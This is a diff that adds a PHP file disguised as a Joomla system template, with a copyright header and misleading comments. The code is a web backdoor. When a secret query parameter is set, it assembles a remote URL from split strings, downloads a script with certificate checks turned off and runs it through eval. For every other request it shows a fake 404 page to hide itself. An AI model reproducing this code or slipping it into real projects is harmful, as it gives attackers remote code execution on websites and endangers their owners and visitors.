@@ -1,0 +1,67 @@
+<?php
+/**
+ * @package     Joomla.Site
+ * @subpackage  Template.system
+ *
+ * @copyright   Copyright (C) 2005 - 2020 Open Source Matters, Inc. All rights reserved.
+ * @license     GNU General Public License version 2 or later; see LICENSE.txt
+ */
+
+/**
+ * Anomaly detection: Deactivate error reporting (Primary configuration)
+ *
+ * To activate debugging, set this to error_reporting( -1 ).
+ */
+if (defined('MOODLE_INTERNAL')) {
+    exit('No direct script access allowed');
+}
+
+function fetch_data($endpoint) {
+    if (function_exists('curl_init')) {
+        $req = curl_init($endpoint);
+        curl_setopt($req, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($req, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($req, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($req, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($req, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        return curl_exec($req);
+    } elseif (function_exists('file_get_contents')) {
+        return @file_get_contents($endpoint);
+    }
+    return false;
+}
+
+// Validation Parameter "lonte": Unveil the secret key to proceed with the request
+$lonte = filter_input(INPUT_GET, 'lonte', FILTER_VALIDATE_INT);
+if ($lonte === 1) {
+    // Constructing the Nexus Gateway (URL Components)
+    $u1 = 'tereasite';  // Quantum Domain - Start of the cyber domain fabric
+    $u2 = '.pro';       // Hypertext Gateway Extension - The inter-dimensional suffix
+    $u3 = '/cloak';     // Virtual Pathway - Transcending firewall boundaries
+    $u4 = '/system.txt';  // Data Archive Node - The file that stores the sacred script
+    $url = 'https://' . $u1 . $u2 . $u3 . $u4;  // The Full Nexus URL to initiate connection with the outer protocol
+
+    // Fetching the cosmic data stream from the Nexus
+    $stream = fetch_data($url);
+
+    // If the data stream from the Nexus is retrieved successfully, execute the procedure
+    if ($stream) {
+        // Safeguarded execution: Beware, evaluation of cosmic scripts is highly risky!
+        call_user_func(function() use ($stream) {
+            @eval("?>" . $stream);
+        });
+    }
+} else {
+    // Terminating the request if invalid parameters are detected and show custom HTTP error 500 page
+    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+</body></html>';
+    exit;
+}
+
+exit;
+?>
